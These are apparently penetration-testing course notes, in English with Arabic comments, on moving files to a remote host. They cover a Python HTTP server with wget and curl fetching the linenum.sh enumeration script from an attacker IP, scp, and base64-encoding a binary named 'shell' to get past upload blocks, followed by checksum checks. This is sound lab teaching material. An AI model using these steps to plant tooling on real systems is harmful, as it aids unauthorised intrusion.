## Using wget
There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

  Transferring Files

```shell-session
htb[/htb]$ cd /tmp
htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
wget http://10.10.14.1:8000/linenum.sh
```
تحمّل الملف linenum.sh من جهازك (IP بتاعك 10.10.14.1) من البورت 8000 وتحفظه بنفس الاسم
```
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
تحمّل الملف linenum.sh من جهازك (IP بتاعك 10.10.14.1) من البورت 8000 وتحفظه بنفس الاسم

---
## Using SCP

```shell-session
htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

---
## Using Base64
- لو في موقع مثلا بيمنع اننا نرفع ملف من عندنا للremote server فا احنا ممكن نعملها encode بالbase64
```shell-session
htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

----
## Validating File Transfers
- to validate the format of file type
```
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

```
htb[/htb]$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```

we can run the same command on remote host
```shell-session
user@remotehost$ md5sum shell
321de1d7e7c3735838890a72c9ae7d1d shell
```